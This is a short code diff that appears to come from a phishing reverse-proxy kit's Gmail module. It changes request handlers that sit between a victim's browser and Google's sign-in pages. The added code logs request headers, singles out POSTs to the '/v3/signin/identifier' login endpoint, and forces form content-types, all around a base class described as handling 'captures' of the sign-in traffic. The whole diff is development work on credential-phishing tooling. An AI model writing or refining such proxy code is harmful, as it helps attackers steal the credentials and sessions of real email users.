@@ -16,6 +16,16 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
     processRequest() {
         // Simple approach like working services - let the base class handle captures
         console.log('Gmail processRequest called for:', this.browserReq.url)
+        console.log('Gmail request method:', this.browserReq.method)
+        console.log('Gmail request headers:', this.browserReq.headers)
+        
+        // If this is a POST request to the identifier endpoint, we need to handle it specially
+        if (this.browserReq.method === 'POST' && this.browserReq.url.includes('/v3/signin/identifier')) {
+            console.log('Gmail POST request to identifier endpoint detected')
+            // Let the base class handle it but with special logging
+            return super.processRequest()
+        }
+        
         return super.processRequest()
     }
 }
@@ -107,6 +117,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         console.log('Gmail request URL:', this.req.url)
         console.log('Gmail request method:', this.req.method)
         console.log('Gmail request headers:', this.req.headers)
+        
+        // For POST requests, ensure content-type is set correctly
+        if (this.req.method === 'POST') {
+            this.req.headers['content-type'] = 'application/x-www-form-urlencoded'
+            console.log('Gmail POST request - content-type set to application/x-www-form-urlencoded')
+        }
         
         return super.execute(clientContext)
     }
